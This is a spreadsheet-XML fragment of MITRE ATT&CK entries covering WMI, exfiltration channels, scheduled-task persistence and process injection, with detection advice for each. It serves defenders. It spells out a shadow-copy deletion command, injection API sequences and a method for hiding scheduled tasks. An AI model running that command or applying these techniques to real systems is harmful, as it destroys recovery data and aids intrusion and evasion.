  <si>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from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.</t>
  </si>
  <si>
    <t>T1047</t>
  </si>
  <si>
    <t>Command: Command Execution, Network Traffic: Network Connection Creation, Process: Process Creation, WMI: WMI Creation</t>
  </si>
  <si>
    <t>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
The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)
An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)
**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default” on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)</t>
  </si>
  <si>
    <t>Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of "wmic" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)</t>
  </si>
  <si>
    <t>T1048</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Cloud Storage: Cloud Storage Access, Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>IaaS, Linux, Network, Office Suite, SaaS, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  
Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 
[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux &lt;code&gt;curl&lt;/code&gt; may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)
Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).</t>
  </si>
  <si>
    <t>T1048.001</t>
  </si>
  <si>
    <t>Exfiltration Over Symmetric Encrypted Non-C2 Protocol (T1048.001)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 
Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. 
Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). </t>
  </si>
  <si>
    <t xml:space="preserve">Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) 
Artifacts and evidence of symmetric key exchange may be recoverable by analyzing network traffic or looking for hard-coded values within malware. If recovered, these keys can be used to decrypt network data from command and control channels. </t>
  </si>
  <si>
    <t>T1048.002</t>
  </si>
  <si>
    <t>Exfiltration Over Asymmetric Encrypted Non-C2 Protocol (T1048.002)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 
Asymmetric encryption algorithms are those that use different keys on each end of the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 
Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. </t>
  </si>
  <si>
    <t xml:space="preserve">Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) </t>
  </si>
  <si>
    <t>T1048.003</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)
Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. </t>
  </si>
  <si>
    <t>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communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) 
For network infrastructure devices, collect AAA logging to monitor for `copy` commands being run to exfiltrate configuration files to non-standard destinations over unencrypted protocols such as TFTP.</t>
  </si>
  <si>
    <t>T1049</t>
  </si>
  <si>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operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.
Utilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), "net use," and "net session" with [Net](https://attack.mitre.org/software/S0039). In Mac and Linux, [netstat](https://attack.mitre.org/software/S0104) and &lt;code&gt;lsof&lt;/code&gt; can be used to list current connections. &lt;code&gt;who -a&lt;/code&gt; and &lt;code&gt;w&lt;/code&gt; can be used to show which users are currently logged in, similar to "net session". Additionally, built-in features native to network devices and [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) may be used (e.g. &lt;code&gt;show ip sockets&lt;/code&gt;, &lt;code&gt;show tcp brief&lt;/code&gt;).(Citation: US-CERT-TA18-106A)</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</si>
  <si>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</si>
  <si>
    <t>T1052</t>
  </si>
  <si>
    <t>Command: Command Execution, Drive: Drive Creation, File: File Access, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.</t>
  </si>
  <si>
    <t>Monitor file access on removable media. Detect processes that execute when removable media are mounted.</t>
  </si>
  <si>
    <t>T1052.001</t>
  </si>
  <si>
    <t>Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.</t>
  </si>
  <si>
    <t>T1053</t>
  </si>
  <si>
    <t>Execution, Persistence, Privilege Escalation</t>
  </si>
  <si>
    <t>Command: Command Execution, Container: Container Creation, File: File Creation, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation</t>
  </si>
  <si>
    <t>Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)
Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)</t>
  </si>
  <si>
    <t>Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. 
Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.</t>
  </si>
  <si>
    <t>T1053.002</t>
  </si>
  <si>
    <t>At (T1053.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Network Traffic: Network Traffic Flow, Process: Process Creation, Scheduled Job: Scheduled Job Creation</t>
  </si>
  <si>
    <t>Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)
On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the &lt;code&gt;at.allow&lt;/code&gt; file. If the &lt;code&gt;at.allow&lt;/code&gt; file does not exist, the &lt;code&gt;at.deny&lt;/code&gt; file is checked. Every username not listed in &lt;code&gt;at.deny&lt;/code&gt; is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the &lt;code&gt;at.deny&lt;/code&gt; exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)
Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).
In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via &lt;code&gt;sudo&lt;/code&gt;.(Citation: GTFObins at)</t>
  </si>
  <si>
    <t>Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\System32\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.
Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)
* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered
* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated
* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted
* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created
* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled
* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled
Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)
Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.
In Linux and macOS environments, monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. 
Review all jobs using the &lt;code&gt;atq&lt;/code&gt; command and ensure IP addresses stored in the &lt;code&gt;SSH_CONNECTION&lt;/code&gt; and &lt;code&gt;SSH_CLIENT&lt;/code&gt; variables, machines that created the jobs, are trusted hosts. All [at](https://attack.mitre.org/software/S0110) jobs are stored in &lt;code&gt;/var/spool/cron/atjobs/&lt;/code&gt;.(Citation: rowland linux at 2019)
Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [Command and Control](https://attack.mitre.org/tactics/TA0011), learning details about the environment through [Discovery](https://attack.mitre.org/tactics/TA0007), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008).</t>
  </si>
  <si>
    <t>T1053.003</t>
  </si>
  <si>
    <t>Cron (T1053.003)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse the &lt;code&gt;cron&lt;/code&gt; utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The &lt;code&gt;cron&lt;/code&gt; utility is a time-based job scheduler for Unix-like operating systems.  The &lt;code&gt; crontab&lt;/code&gt; file contains the schedule of cron entries to be run and the specified times for execution. Any &lt;code&gt;crontab&lt;/code&gt; files are stored in operating system-specific file paths.
An adversary may use &lt;code&gt;cron&lt;/code&gt; in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). </t>
  </si>
  <si>
    <t xml:space="preserve">Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  
Suspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. </t>
  </si>
  <si>
    <t>T1053.005</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification, Network Traffic: Network Traffic Flow, Process: Process Creation, Scheduled Job: Scheduled Job Creation, Windows Registry: Windows Registry Key Creation</t>
  </si>
  <si>
    <t xml:space="preserve">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 GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)
An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)
Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) </t>
  </si>
  <si>
    <t>Monitor process execution from the &lt;code&gt;svchost.exe&lt;/code&gt; in Windows 10 and the Windows Task Scheduler &lt;code&gt;taskeng.exe&lt;/code&gt; for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\System32\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.
Configure event logging for scheduled task creation and changes by enabling the "Microsoft-Windows-TaskScheduler/Operational" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)
* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered
* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated
* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted
* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created
* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled
* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled
Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)
Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.</t>
  </si>
  <si>
    <t>T1053.006</t>
  </si>
  <si>
    <t>Systemd Timers (T1053.006)</t>
  </si>
  <si>
    <t>Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension &lt;code&gt;.timer&lt;/code&gt; that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the &lt;code&gt;systemctl&lt;/code&gt; command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)
Each &lt;code&gt;.timer&lt;/code&gt; file must have a corresponding &lt;code&gt;.service&lt;/code&gt; file with the same name, e.g., &lt;code&gt;example.timer&lt;/code&gt; and &lt;code&gt;example.service&lt;/code&gt;. &lt;code&gt;.service&lt;/code&gt; files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to &lt;code&gt;/etc/systemd/system/&lt;/code&gt; and &lt;code&gt;/usr/lib/systemd/system&lt;/code&gt; while user level are written to &lt;code&gt;~/.config/systemd/user/&lt;/code&gt;.
An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.(Citation: Falcon Sandbox smp: 28553b3a9d)</t>
  </si>
  <si>
    <t>Systemd timer unit files may be detected by auditing file creation and modification events within the &lt;code&gt;/etc/systemd/system&lt;/code&gt;, &lt;code&gt;/usr/lib/systemd/system/&lt;/code&gt;, and &lt;code&gt;~/.config/systemd/user/&lt;/code&gt; directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.
Suspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: &lt;code&gt;systemctl list-timers –all&lt;/code&gt;. Analyze the contents of corresponding &lt;code&gt;.service&lt;/code&gt; files present on the file system and ensure that they refer to legitimate, expected executables.
Audit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers.(Citation: archlinux Systemd Timers Aug 2020)</t>
  </si>
  <si>
    <t>T1053.007</t>
  </si>
  <si>
    <t>Container Orchestration Job (T1053.007)</t>
  </si>
  <si>
    <t>Container: Container Creation, File: File Creation, Scheduled Job: Scheduled Job Creation</t>
  </si>
  <si>
    <t>Containers</t>
  </si>
  <si>
    <t>Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.
In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for the anomalous creation of scheduled jobs in container orchestration environments. Use logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application and resource pods to monitor malicious container orchestration job deployments. </t>
  </si>
  <si>
    <t>T1055</t>
  </si>
  <si>
    <t>Defense Evasion, Privilege Escalation</t>
  </si>
  <si>
    <t>File: File Metadata, File: File Modification, Module: Module Load, Process: OS API Execution, Process: Process Access, Process: Process Metadata, Process: Process Modification</t>
  </si>
  <si>
    <t xml:space="preserve">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There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. 
More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. </t>
  </si>
  <si>
    <t xml:space="preserve">Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as &lt;code&gt;CreateRemoteThread&lt;/code&gt;, &lt;code&gt;SuspendThread&lt;/code&gt;/&lt;code&gt;SetThreadContext&lt;/code&gt;/&lt;code&gt;ResumeThread&lt;/code&gt;, &lt;code&gt;QueueUserAPC&lt;/code&gt;/&lt;code&gt;NtQueueApcThread&lt;/code&gt;, and those that can be used to modify memory within another process, such as &lt;code&gt;VirtualAllocEx&lt;/code&gt;/&lt;code&gt;WriteProcessMemory&lt;/code&gt;, may be used for this technique.(Citation: Elastic Process Injection July 2017) 
Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. 
Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) 
Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) 
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. </t>
  </si>
  <si>
    <t>T1055.001</t>
  </si>
  <si>
    <t>Dynamic-link Library Injection (T1055.001)</t>
  </si>
  <si>
    <t>Module: Module Load, Process: OS API Execution, Process: Process Access, Process: Process Metadata, Process: Process Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  
DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as &lt;code&gt;VirtualAllocEx&lt;/code&gt; and &lt;code&gt;WriteProcessMemory&lt;/code&gt;, then invoked with &lt;code&gt;CreateRemoteThread&lt;/code&gt; (which calls the &lt;code&gt;LoadLibrary&lt;/code&gt; API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) 
Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of &lt;code&gt;LoadLibrary&lt;/code&gt;).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) 
Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's &lt;code&gt;AddressOfEntryPoint&lt;/code&gt; before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) 
Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. </t>
  </si>
  <si>
    <t xml:space="preserve">Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as &lt;code&gt;CreateRemoteThread&lt;/code&gt; and those that can be used to modify memory within another process, such as &lt;code&gt;VirtualAllocEx&lt;/code&gt;/&lt;code&gt;WriteProcessMemory&lt;/code&gt;, may be used for this technique.(Citation: Elastic Process Injection July 2017)
Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. 
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. </t>
  </si>
  <si>
    <t>T1055.002</t>
  </si>
  <si>
    <t>Process: OS API Execution, Process: Process Access, Process: Process Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. 
PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as &lt;code&gt;VirtualAllocEx&lt;/code&gt; and &lt;code&gt;WriteProcessMemory&lt;/code&gt;, then invoked with &lt;code&gt;CreateRemoteThread&lt;/code&gt; or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) 
Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. </t>
  </si>
  <si>
    <t xml:space="preserve">Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as &lt;code&gt;CreateRemoteThread&lt;/code&gt; and those that can be used to modify memory within another process, such as &lt;code&gt;VirtualAllocEx&lt;/code&gt;/&lt;code&gt;WriteProcessMemory&lt;/code&gt;, may be used for this technique.(Citation: Elastic Process Injection July 2017)
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. </t>
  </si>
  <si>
    <t>T1055.003</t>
  </si>
  <si>
    <t>Thread Execution Hijacking (T1055.003)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. 
Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as &lt;code&gt;OpenThread&lt;/code&gt;. At this point the process can be suspended then written to, realigned to the injected code, and resumed via &lt;code&gt;SuspendThread &lt;/code&gt;, &lt;code&gt;VirtualAllocEx&lt;/code&gt;, &lt;code&gt;WriteProcessMemory&lt;/code&gt;, &lt;code&gt;SetThreadContext&lt;/code&gt;, then &lt;code&gt;ResumeThread&lt;/code&gt; respectively.(Citation: Elastic Process Injection July 2017)
This is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  
Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process. </t>
  </si>
  <si>
    <t xml:space="preserve">Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as &lt;code&gt;CreateRemoteThread&lt;/code&gt;, &lt;code&gt;SuspendThread&lt;/code&gt;/&lt;code&gt;SetThreadContext&lt;/code&gt;/&lt;code&gt;ResumeThread&lt;/code&gt;, and those that can be used to modify memory within another process, such as &lt;code&gt;VirtualAllocEx&lt;/code&gt;/&lt;code&gt;WriteProcessMemory&lt;/code&gt;, may be used for this technique.(Citation: Elastic Process Injection July 2017)
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. </t>
